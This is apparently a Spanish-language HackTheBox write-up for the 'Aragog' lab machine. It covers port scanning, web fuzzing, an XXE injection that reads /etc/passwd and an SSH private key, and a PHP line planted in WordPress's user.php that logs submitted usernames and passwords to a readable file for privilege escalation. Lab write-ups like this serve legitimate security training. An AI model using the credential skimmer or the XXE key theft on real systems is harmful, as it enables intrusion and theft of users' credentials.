---
layout: post
toc: true
title: "Aragog - HackTheBox Writeup"
categories: HackTheBox
tags: [CTF, Web]
author:
  - H4RRIZN
---

![logo](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/cef48565b774e170c638c80c6cb99b6097d44298/_includes/CTFIMG/Aragog/aragog.png)

## Reconocimiento Inicial
Para comenzar realizamos un scan con nmap para detectar los puertos abiertos del host victima:   
```bash
nmap -sS --min-rate 1500 -p- --open -vv -n -Pn 10.10.10.78
```
![recon1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8f8206a4d207f45efa0aeb1b9552be086fd024b9/_includes/CTFIMG/Aragog/recon1.png)

Realizamos otro scan para detectar los servicios y versiones que se están utilizando en los puertos detectados:   
```bash
nmap -sCV -p21,22,80 10.10.10.78
```
![recon2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/8f8206a4d207f45efa0aeb1b9552be086fd024b9/_includes/CTFIMG/Aragog/recon2.png)

Observamos que en el escaneo resultante podemos ingresar de forma anónima al FTP. Además de que en el servicio HTTP se esta redirigiendo hacia el dominio **`aragog.htb`** por lo que añadimos este al fichero hosts de nuestra maquina.
Al ingresar al servicio FTP podemos identificar el fichero **test.txt**. Lo descargare para visualizar su contenido:
![recon3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/2498b257aaf108a57daa4ece51c277937350b232/_includes/CTFIMG/Aragog/recon3.png)

Al ver el el contenido del fichero notamos que se asemeja al de la estructura XML. Además de contener una mascara de red en el detalle. De momento no tenemos un uso en particular para este fichero:    
![recon4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/2498b257aaf108a57daa4ece51c277937350b232/_includes/CTFIMG/Aragog/recon4.png)

## Reconocimiento Web
Desde este punto al ingresar al servicio HTTP podemos ver una pagina por defecto del servidor de Apache:    
![recweb1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3244f0e7f4f571f89e90565c8374e2d79acade55/_includes/CTFIMG/Aragog/recweb1.png)

Generalmente los servidores Apache utilizan el lenguaje de programación PHP. 
Para realizar fuzzing de está extensión y encontrar posibles ficheros utilizare la herramienta **wfuzz**. Utilizaremos 2 payloads, uno para descubrir rutas y otro para mezclar estas rutas con las extensiones **`html`**,**`php`** y **`txt`**:     
```bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,html-php-txt -u http://aragog.htb/FUZZ.FUZ2Z -t 200
```

Observamos que se ha encontrado el fichero **`hosts.php`**:     
![recweb2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3244f0e7f4f571f89e90565c8374e2d79acade55/_includes/CTFIMG/Aragog/recweb2.png)

Ingresamos a este mediante el navegador y podemos ver el mensaje de “**`There are 4294967294 possible hosts for`**”
![recweb3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/3244f0e7f4f571f89e90565c8374e2d79acade55/_includes/CTFIMG/Aragog/recweb3.png)

### Detectando XXE
Algo que podemos probar con el fichero descargado desde el servidor FTP es enviarlo como data al servidor HTTP.
Podemos realizar esto con curl:    
![xxe1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/14979102197472ca0c791cee5826d7ce5fe3e184/_includes/CTFIMG/Aragog/xxe1.png)

Y como vemos nos entrega un resultado distinto. Con esto podemos pensar que el script **`host.php`** sirve como una calculadora de subredes. Podemos enviarlo directamente en BurpSuite cambiando la IP para probar si realiza la misma operación y nos entrega un resultado distinto:    
![xxe2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/14979102197472ca0c791cee5826d7ce5fe3e184/_includes/CTFIMG/Aragog/xxe2.png)

Y vemos que efectivamente no solo nos entrega un resultado distinto para la mascara si no que además esta interpretando el contenido del fichero en formato XML.
Desde este punto podemos intentar realizar una inyección XXE básica para recuperar algún fichero interno de la maquina como seria el fichero **`/etc/passwd`**         
![xxe3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/14979102197472ca0c791cee5826d7ce5fe3e184/_includes/CTFIMG/Aragog/xxe3.png)
Y tenemos la capacidad de realizar una inyección XXE.
## Shell as Florian
Ya que la vulnerabilidad esta confirmada podemos intentar recuperar la llave **`id_rsa`** de alguna de los usuarios del sistema que cuentan con una bash. Para este caso en particular tenemos 3 usuarios: **`root`**, **`florian`** y **`cliff`**. Como puede ser obvio lo más seguro es que si intentamos recuperar la **`id_rsa`** del usuario root no podremos, por lo que veremos si podemos recuperar el **`id_rsa`** de **`florian`** o **`cliff`**.
En este caso no tenemos resultados con el usuario **`cliff`**:            
![shell1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/6aba1470d3e86959cc2419b57fda2331c817c4ef/_includes/CTFIMG/Aragog/shell1.png)

Pero con el usuario **`florian`** es un caso distinto y obtenemos una **`id_rsa`** que nos servirá para conectarnos a la maquina victima:      
![shell2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/6aba1470d3e86959cc2419b57fda2331c817c4ef/_includes/CTFIMG/Aragog/shell2.png)

Es importante que la llave **`id_rsa`** contenga los permisos necesarios para conectarnos por lo que debemos modificarlos con chmod:     
```bash
chmod 600 id_rsa
```
![shell3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/6aba1470d3e86959cc2419b57fda2331c817c4ef/_includes/CTFIMG/Aragog/shell3.png)
Ya tenemos acceso.

## Privesc
Para la escalada de privilegios utilice linpeas el cual revela ficheros que han sido modificados en los últimos 5 minutos los cuales corresponden a ficheros de WordPress ubicados en **`/var/www/dev_wiki`**:      
![privesc1](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc1.png)

Al ingresar mediante el navegador observamos que efectivamente hay un wordpress ejecutandose:         
![privesc2](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc2.png)

Llama la atención que los ficheros hayan sido modificados en los últimos 5 minutos por lo que utilizaremos la herramienta **`pspy`** para observar si se están ejecutando comandos que no podamos detectar:        
![privesc3](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc3.png)

Observamos en el output de pspy que el grupo de procesos que se inicia cada cinco minutos llama a **`/root/restore.sh`**, lo que parece reiniciar el sitio de wordpress. Además de un fichero **`wp-login.py`** el cual está siendo ejecutado por el usuario **`cliff`**.
Con esto podemos llegar a conclusión de que se esta autenticando el usuario **`cliff`**. Como tenemos permisos de escritura en los ficheros del servidor de wordpress podemos intentar modificar alguno de estos para que al momento de que se realice la autenticación del mismo, escribir en un fichero aparte las credenciales ingresadas del usuario en cuestión. Esto lo podemos lograr modificando el fichero **`user.php`** en **`wp-includes`**:       
![privesc4](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc4.png)

Ahora incluimos el siguiente fragmento de código para depositar un fichero que llamaremos **`hijack.txt`** el cual contendrá por una parte **`log`** que corresponde al nombre de usuario y **`pwd`** el cual corresponde a la contraseña del mismo:      
```bash
file_put_contents("/var/www/html/dev_wiki/hijack.txt", $_POST['log'] . " : " . $_POST['pwd'], FILE_APPEND);
```
![privesc5](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc5.png)

Ahora tocaría esperar a que los comandos se ejecuten y se deposite el fichero. Estaremos realizando una petición a este fichero de manera constante:     
```bash
watch -n 1 curl -s -X GET http://10.10.10.78/dev_wiki/hijack.txt
```
![privesc6](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc6.png)

Y luego de esperar un poco se almacenan credenciales para el usuario Administrator en el fichero hijack.txt:       
![privesc7](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc7.png)

Las reutilizaremos con el usuario **`cliff`**:         
![privesc8](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc8.png)

Y no funcionan. Las probamos con el usuario root:          
![privesc9](https://raw.githubusercontent.com/H4RRIZN/H4RRIZN.github.io/4afbddbe4818ca9be50dc016d5c86ae6e1e3e524/_includes/CTFIMG/Aragog/privesc9.png)

Y somos usuario root con el cual podremos leer las flags.

Pwned! 🏴‍☠️